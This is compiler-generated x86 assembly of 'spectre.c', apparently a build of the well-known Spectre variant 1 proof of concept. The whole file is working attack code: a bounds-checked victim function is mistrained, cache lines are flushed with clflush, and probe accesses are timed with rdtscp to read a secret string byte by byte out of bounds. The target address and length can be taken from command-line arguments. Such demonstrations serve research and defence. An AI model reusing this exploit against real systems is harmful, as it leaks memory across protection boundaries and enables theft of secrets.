	.file	"spectre.c"
	.text
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	4(%esp), %eax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5563:
	.cfi_startproc
	pushl	%edi
	.cfi_def_cfa_offset 8
	.cfi_offset 7, -8
	pushl	%esi
	.cfi_def_cfa_offset 12
	.cfi_offset 6, -12
	pushl	%ebx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	call	__x86.get_pc_thunk.di
	addl	$_GLOBAL_OFFSET_TABLE_, %edi
	movl	16(%esp), %eax
	movl	array1_size@GOTOFF(%edi), %edx
	cmpl	%eax, %edx
	jbe	.L2
	subl	$1, %eax
	js	.L2
	movzbl	temp@GOTOFF(%edi), %ecx
	leal	array1@GOTOFF(%edi,%eax), %eax
	leal	array2@GOTOFF(%edi), %esi
	leal	array1@GOTOFF(%edi), %ebx
.L4:
	movzbl	(%eax), %edx
	sall	$9, %edx
	andb	(%edx,%esi), %cl
	subl	$1, %eax
	cmpl	%ebx, %eax
	jns	.L4
	movb	%cl, temp@GOTOFF(%edi)
.L2:
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 12
	popl	%esi
	.cfi_restore 6
	.cfi_def_cfa_offset 8
	popl	%edi
	.cfi_restore 7
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5563:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5564:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	pushl	%edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	pushl	%esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	pushl	%ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	subl	$60, %esp
	.cfi_def_cfa_offset 80
	call	__x86.get_pc_thunk.bp
	addl	$_GLOBAL_OFFSET_TABLE_, %ebp
	movl	%gs:20, %eax
	movl	%eax, 44(%esp)
	xorl	%eax, %eax
	movl	$0, 36(%esp)
	leal	results@GOTOFF(%ebp), %eax
	leal	1024(%eax), %edx
.L8:
	movl	$0, (%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jne	.L8
	movl	$999, 28(%esp)
	leal	array2@GOTOFF(%ebp), %eax
	movl	%eax, 16(%esp)
	jmp	.L9
.L11:
	movl	%ebx, %eax
	imull	%edi
	movl	%ebx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	leal	(%edx,%edx,2), %edx
	addl	%edx, %edx
	movl	%ebx, %eax
	subl	%edx, %eax
	subl	$1, %eax
	movl	%eax, %ecx
	movw	$0, %cx
	shrl	$16, %eax
	movl	8(%esp), %edx
	xorl	80(%esp), %edx
	orl	%ecx, %eax
	andl	%eax, %edx
	xorl	8(%esp), %edx
	pushl	%edx
	.cfi_def_cfa_offset 84
	call	victim_function
	subl	$1, %ebx
	addl	$4, %esp
	.cfi_def_cfa_offset 80
	cmpl	$-1, %ebx
	je	.L24
.L13:
	clflush	(%esi)
	movl	$0, 40(%esp)
	movl	40(%esp), %eax
	cmpl	$99, %eax
	jg	.L11
.L12:
	movl	40(%esp), %eax
	addl	$1, %eax
	movl	%eax, 40(%esp)
	movl	40(%esp), %eax
	cmpl	$99, %eax
	jle	.L12
	jmp	.L11
.L24:
	movl	$13, %edi
	leal	results@GOTOFF(%ebp), %eax
	movl	%eax, 24(%esp)
	movl	%edi, %ebx
	jmp	.L15
.L26:
	movl	24(%esp), %eax
	addl	$1, (%eax,%esi,4)
.L14:
	addl	$167, %ebx
	cmpl	$42765, %ebx
	je	.L25
.L15:
	movzbl	%bl, %esi
	movl	%esi, %edi
	sall	$9, %edi
	rdtscp
	movl	%eax, 8(%esp)
	movl	%edx, 12(%esp)
	movl	%ecx, 36(%esp)
	movl	16(%esp), %edx
	movzbl	(%edx,%edi), %eax
	rdtscp
	movl	%ecx, 36(%esp)
	subl	8(%esp), %eax
	sbbl	12(%esp), %edx
	movl	%edx, %ecx
	movl	%eax, %edx
	movl	$50, %eax
	cmpl	%edx, %eax
	movl	$0, %eax
	sbbl	%ecx, %eax
	jc	.L14
	movl	array1_size@GOTOFF(%ebp), %ecx
	movl	20(%esp), %eax
	cltd
	idivl	%ecx
	movzbl	array1@GOTOFF(%ebp,%edx), %eax
	cmpl	%esi, %eax
	jne	.L26
	jmp	.L14
.L25:
	subl	$1, 28(%esp)
	je	.L16
.L9:
	movl	28(%esp), %eax
	movl	%eax, 20(%esp)
	leal	array2@GOTOFF(%ebp), %eax
	leal	131072(%eax), %edx
.L10:
	clflush	(%eax)
	addl	$512, %eax
	cmpl	%eax, %edx
	jne	.L10
	movl	array1_size@GOTOFF(%ebp), %esi
	movl	20(%esp), %eax
	cltd
	idivl	%esi
	movl	%edx, 8(%esp)
	movl	$29, %ebx
	leal	array1_size@GOTOFF(%ebp), %esi
	movl	$715827883, %edi
	jmp	.L13
.L16:
	movl	results@GOTOFF(%ebp), %eax
	xorl	36(%esp), %eax
	movl	%eax, results@GOTOFF(%ebp)
	movl	44(%esp), %eax
	subl	%gs:20, %eax
	jne	.L27
	addl	$60, %esp
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	popl	%esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	popl	%edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L27:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5564:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5565:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	subl	$72, %esp
	call	__x86.get_pc_thunk.dx
	addl	$_GLOBAL_OFFSET_TABLE_, %edx
	movl	%edx, -68(%ebp)
	movl	%ecx, %eax
	movl	(%ecx), %ecx
	movl	%ecx, -84(%ebp)
	movl	4(%eax), %eax
	movl	%eax, -88(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
	movl	stdin@GOT(%edx), %eax
	movl	%eax, -76(%ebp)
	leal	check@GOTOFF(%edx), %eax
	movl	%eax, -80(%ebp)
.L29:
	subl	$12, %esp
	movl	-76(%ebp), %eax
	pushl	(%eax)
	movl	-68(%ebp), %ebx
	call	getc@PLT
	addl	$16, %esp
	cmpb	$114, %al
	je	.L44
	cmpb	$10, %al
	je	.L29
	cmpb	$105, %al
	jne	.L38
	movl	-68(%ebp), %ebx
	call	getpid@PLT
	subl	$12, %esp
	pushl	%eax
	movl	-80(%ebp), %eax
	cltd
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%edx
	pushl	%eax
	leal	.LC8@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L29
.L44:
	movl	-68(%ebp), %edi
	movl	secret@GOTOFF(%edi), %eax
	pushl	%eax
	pushl	%eax
	leal	.LC0@GOTOFF(%edi), %eax
	pushl	%eax
	pushl	$1
	movl	%edi, %ebx
	call	__printf_chk@PLT
	movl	secret@GOTOFF(%edi), %eax
	leal	array1@GOTOFF(%edi), %ecx
	movl	%eax, %edx
	subl	%ecx, %edx
	movl	%edx, -48(%ebp)
	movl	%eax, (%esp)
	call	strlen@PLT
	addl	$16, %esp
	movl	%eax, -44(%ebp)
	leal	array2@GOTOFF(%edi), %eax
	leal	131072(%eax), %edx
.L31:
	movb	$1, (%eax)
	addl	$1, %eax
	cmpl	%edx, %eax
	jne	.L31
	cmpl	$3, -84(%ebp)
	je	.L45
.L32:
	subl	$4, %esp
	pushl	-44(%ebp)
	movl	-68(%ebp), %ebx
	leal	.LC4@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	addl	$16, %esp
	testl	%eax, %eax
	js	.L29
	movl	$0, -72(%ebp)
	leal	.LC6@GOTOFF(%ebx), %eax
	movl	%eax, -64(%ebp)
	jmp	.L36
.L45:
	subl	$4, %esp
	leal	-48(%ebp), %eax
	pushl	%eax
	movl	-68(%ebp), %ebx
	leal	.LC1@GOTOFF(%ebx), %eax
	pushl	%eax
	movl	-88(%ebp), %edi
	pushl	4(%edi)
	call	__isoc99_sscanf@PLT
	leal	array1@GOTOFF(%ebx), %eax
	subl	%eax, -48(%ebp)
	addl	$12, %esp
	leal	-44(%ebp), %eax
	pushl	%eax
	leal	.LC2@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	8(%edi)
	call	__isoc99_sscanf@PLT
	pushl	-44(%ebp)
	pushl	-48(%ebp)
	leal	.LC3@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L32
.L47:
	pushl	%eax
	pushl	%ecx
	pushl	-64(%ebp)
	pushl	$1
	movl	-68(%ebp), %ebx
	call	__printf_chk@PLT
	movl	-60(%ebp), %eax
	pushl	(%eax)
	pushl	%edi
	pushl	-64(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
.L34:
	addl	$1, %edi
	addl	$4, %esi
	cmpl	$256, %edi
	je	.L46
.L35:
	leal	-1(%edi), %ecx
	movl	%esi, -60(%ebp)
	movl	-4(%esi), %eax
	movl	(%esi), %edx
	cmpl	%edx, %eax
	jle	.L34
	movl	%eax, %ebx
	subl	%edx, %ebx
	cmpl	$100, %ebx
	jle	.L34
	jmp	.L47
.L46:
	subl	$8, %esp
	movl	-68(%ebp), %ebx
	leal	.LC7@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	addl	$16, %esp
	testl	%eax, %eax
	js	.L29
.L36:
	movl	-68(%ebp), %ebx
	movl	secret@GOTOFF(%ebx), %eax
	movl	-72(%ebp), %edi
	movsbl	(%eax,%edi), %eax
	subl	$12, %esp
	pushl	%eax
	pushl	%eax
	pushl	-48(%ebp)
	leal	.LC5@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$1, %edi
	movl	%edi, -72(%ebp)
	movl	-48(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -48(%ebp)
	addl	$28, %esp
	leal	-40(%ebp), %edx
	pushl	%edx
	leal	-30(%ebp), %edx
	pushl	%edx
	pushl	%eax
	call	readMemoryByte
	leal	4+results@GOTOFF(%ebx), %esi
	addl	$16, %esp
	movl	$1, %edi
	jmp	.L35
.L38:
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	jne	.L48
	movl	$0, %eax
	leal	-16(%ebp), %esp
	popl	%ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
.L48:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	main, .-main
	.local	results
	.comm	results,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC9:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC9
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5566:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE5566:
	.section	.text.__x86.get_pc_thunk.dx,"axG",@progbits,__x86.get_pc_thunk.dx,comdat
	.globl	__x86.get_pc_thunk.dx
	.hidden	__x86.get_pc_thunk.dx
	.type	__x86.get_pc_thunk.dx, @function
__x86.get_pc_thunk.dx:
.LFB5567:
	.cfi_startproc
	movl	(%esp), %edx
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.di,"axG",@progbits,__x86.get_pc_thunk.di,comdat
	.globl	__x86.get_pc_thunk.di
	.hidden	__x86.get_pc_thunk.di
	.type	__x86.get_pc_thunk.di, @function
__x86.get_pc_thunk.di:
.LFB5568:
	.cfi_startproc
	movl	(%esp), %edi
	ret
	.cfi_endproc
.LFE5568:
	.section	.text.__x86.get_pc_thunk.bp,"axG",@progbits,__x86.get_pc_thunk.bp,comdat
	.globl	__x86.get_pc_thunk.bp
	.hidden	__x86.get_pc_thunk.bp
	.type	__x86.get_pc_thunk.bp, @function
__x86.get_pc_thunk.bp:
.LFB5569:
	.cfi_startproc
	movl	(%esp), %ebp
	ret
	.cfi_endproc
.LFE5569:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
